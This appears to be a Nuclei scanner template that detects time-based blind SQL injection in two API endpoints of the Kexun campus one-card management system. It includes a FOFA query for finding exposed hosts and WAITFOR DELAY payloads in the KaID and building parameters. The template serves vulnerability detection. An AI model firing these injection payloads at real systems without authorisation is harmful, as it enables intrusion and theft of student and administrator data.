id: kexunxiaoyuan-get_kq_tj_today-dormitoryHealthRanking-sql

info:
  name: "科讯校园一卡通管理系统 get_kq_tj_today、dormitoryHealthRanking 接口 SQL 注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: body="http://www.ahkxsoft.com/" && body="一卡通登录"
      科讯校园一卡通管理系统在get_kq_tj_today、dormitoryHealthRanking等多个接口中存在SQL注入缺陷。攻击者可通过构造恶意SQL语句实现数据库结构枚举与敏感数据提取（包括但不限于管理员后台凭证及用户隐私信息），在具备高权限访问条件下可进一步通过注入点执行系统命令，实现WebShell部署及服务器控制权获取。
  reference:
  - https://Unknown.blog.csdn.net/article/details/140709894
  tags: 科讯校园一卡通管理系统



http:
- raw:
  - |
    GET /api/get_kq_tj_today?KaID=1%27;WAITFOR%20DELAY%20%270:0:4%27-- HTTP/1.1
    Host: {{Hostname}}


  - |
    GET /api/get_kq_tj_today?KaID=1%27;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
    Host: {{Hostname}}

  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
- raw:
  - |
    GET /api/dormitoryHealthRanking?building=1%27%3BWAITFOR+DELAY+%270%3A0%3A4%27-- HTTP/1.1
    Host: {{Hostname}}


  - |
    GET /api/dormitoryHealthRanking?building=1%27%3BWAITFOR+DELAY+%270%3A0%3A8%27-- HTTP/1.1
    Host: {{Hostname}}

  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and






